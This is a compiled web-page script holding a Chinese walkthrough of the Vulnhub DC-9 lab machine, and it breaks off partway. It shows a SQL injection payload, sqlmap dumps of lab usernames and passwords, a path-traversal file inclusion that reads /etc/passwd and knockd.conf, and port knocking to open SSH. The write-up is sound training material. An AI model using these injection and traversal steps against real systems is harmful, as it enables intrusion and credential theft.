(window.webpackJsonp=window.webpackJsonp||[]).push([[61],{385:function(s,a,t){"use strict";t.r(a);var e=t(3),n=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"vulnhub-dc-9-靶机实战"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#vulnhub-dc-9-靶机实战"}},[s._v("#")]),s._v(" Vulnhub DC-9 靶机实战")]),s._v(" "),a("h2",{attrs:{id:"前言"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[s._v("#")]),s._v(" 前言")]),s._v(" "),a("p",[s._v("最近看到同学在搞Vulnhub上的靶机，感觉很有意思，于是就自己试着下了个靶机整一整")]),s._v(" "),a("p",[s._v("相比于CTF线上赛题对某个或者某些知识点的考察，对靶机的渗透还是更综合和贴近实践的")]),s._v(" "),a("p",[s._v("整个过程可以说是一路遇坑（一开始虚拟网络NAT模式怎么都扫不到靶机。。。。最后直接无脑上桥接了）")]),s._v(" "),a("p",[s._v("不过也因此学到了很多工具的用法和一些fuzz技巧")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/EkiXu/pics/img/Screenshot_2020-01-15_17-15-44.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"渗透记录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#渗透记录"}},[s._v("#")]),s._v(" 渗透记录")]),s._v(" "),a("p",[s._v("首先用")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("扫一下靶机地址 返回")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".31.222  00:0c:29:3d:d1:6f       VMware, Inc.\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("然后nmap扫一下服务")]),s._v(" "),a("div",{staticClass:"language-sehll line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("nmap -A 192.168.31.222\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 14:42 CST\nNmap scan report for 192.168.31.222\nHost is up (0.00034s latency).\nNot shown: 998 closed ports\nPORT   STATE    SERVICE VERSION\n22/tcp filtered ssh\n80/tcp open     http    Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Example.com - Staff Details - Welcome\nMAC Address: 00:0C:29:3D:D1:6F (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nNetwork Distance: 1 hop\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[s._v("发现有个http服务")]),s._v(" "),a("p",[s._v("登陆是个管理界面可以查询")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://ctf.ieki.xyz/assets/images/image-20200115151231167.png",alt:"image-20200115151231167"}})]),s._v(" "),a("p",[a("code",[s._v("1' or '1'='1")]),s._v("返回所有记录，存在注入点")]),s._v(" "),a("p",[s._v("用sqlmap跑一跑")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("sqlmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-r")]),s._v(" post.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" search "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--dbs")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v(":01:46"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" fetching database names\navailable databases "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(":\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" information_schema\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Staff\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("users")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("先爆一下Users")]),s._v(" "),a("p",[s._v("只有一张表，表里的数据如下")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("Database: "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("users")]),s._v("\nTable: UserDetails\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),s._v(" entries"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+----+------------+---------------+---------------------+-----------+-----------+\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("id")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" lastname   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" password      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" reg_date            "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" username  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" firstname "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n+----+------------+---------------+---------------------+-----------+-----------+\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Moe        "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" 3kfs86sfd     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" marym     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Mary      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Dooley     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" 468sfdfsd2    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" julied    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Julie     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Flintstone "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" 4sfd87sfd1    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" fredf     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Fred      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Rubble     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" RocksOff      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" barneyr   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Barney    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Cat        "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" TC"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("TheBoyz    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" tomc      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Tom       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Mouse      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" B8m"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Flintstone "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Pebbles       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" wilmaf    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Wilma     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Rubble     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" BamBam01      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" bettyr    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Betty     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Bing       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" UrAG0D"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" chandlerb "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Chandler  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Tribbiani  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Passw0rd      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" joeyt     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Joey      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Green      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" yN72"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Geller     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ILoveRachel   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" rossg     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Ross      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("13")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Geller     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" 3248dsds7s    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" monicag   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Monica    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Buffay     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" smellycats    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" phoebeb   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Phoebe    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" McScoots   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" YR3BVxxxw87   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" scoots    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Scooter   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Trump      "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Ilovepeepee   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:26 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" janitor   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Donald    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Morrison   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Hawaii-Five-0 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-12-29 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":58:28 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" janitor2  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" Scott     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n+----+------------+---------------+---------------------+-----------+-----------+\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br")])]),a("p",[s._v("以为是管理页面的登录名和密码，但是试了一下发现不是。。。。。先放着")]),s._v(" "),a("p",[s._v("在Staff里发现了一条")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Database: Staff\nTable: Users\n[1 entry]\n+--------+----------------------------------+----------+\n| UserID | Password                         | Username |\n+--------+----------------------------------+----------+\n| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |\n+--------+----------------------------------+----------+\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("反查md5发现是 transorbital1")]),s._v(" "),a("p",[s._v("登上去以后发现能Add Record")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://ctf.ieki.xyz/assets/images/image-20200115154745245.png",alt:"image-20200115154745245"}})]),s._v(" "),a("p",[s._v("最下方居然有个File does not exist")]),s._v(" "),a("p",[s._v("提醒我们是不是存在本地文件包含漏洞")]),s._v(" "),a("p",[s._v("试一下加个file参数")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://192.168.31.222/addrecord.php?file=../../../../../../../etc/passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("发现底部果然返回了文件内容")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://ctf.ieki.xyz/assets/images/image-20200115155021258.png",alt:"image-20200115155021258"}})]),s._v(" "),a("p",[s._v("都加x了,没啥用")]),s._v(" "),a("p",[s._v("再读一下../../../../../../../etc/shadow")]),s._v(" "),a("p",[s._v("读不出来，（想也没有权限。。。。")]),s._v(" "),a("p",[s._v("接下去怎么办呢")]),s._v(" "),a("p",[s._v("我们前面看nmap的时候发现还存在ssh服务")]),s._v(" "),a("p",[s._v("但是处于filter状态，")]),s._v(" "),a("p",[s._v("怎么连上ssh呢")]),s._v(" "),a("p",[s._v("了解到knock这种东西")]),s._v(" "),a("blockquote",[a("p",[s._v("knockd 监视一个预定义模式在iptables的日志,")]),s._v(" "),a("p",[s._v("例如一次击中端口6356,一次击中端口63356,两次击中端口9356,")]),s._v(" "),a("p",[s._v("这相当于敲一个关闭的门用一种特殊的暗码来被konckd识别,")]),s._v(" "),a("p",[s._v("konckd 将使用iptables来打开一个预定义端口")]),s._v(" "),a("p",[s._v("例如ssh的22端口在一个预定定义时间.(比如一分钟),如果一个ssh session 在这个时间范围内打开,这个端口会一直保留.直到预定义时间过期后ssh端口被knockd关掉.")])]),s._v(" "),a("p",[s._v("可以读到其配置文件 ../../../../../../../etc/knockd.conf")]),s._v(" "),a("div",{staticClass:"language-txt line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-txt"}},[a("code",[s._v("[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("所以我们只要这样就可以打开ssh了")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("root@kali:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# knock 192.168.31.222 7469 8475 9842 #对应sequence")]),s._v("\nroot@kali:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# nmap -p22 192.168.31.222")]),s._v("\nStarting Nmap "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7.80")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" https://nmap.org "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),s._v("-01-15 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":09 CST\nNmap scan report "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".31.222\nHost is up "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(".00031s latency"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\n\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\nMAC Address: 00:0C:29:3D:D1:6F "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("VMware"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nNmap done: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" IP address "),a("span",{pre:!0,attrs:{class:"token 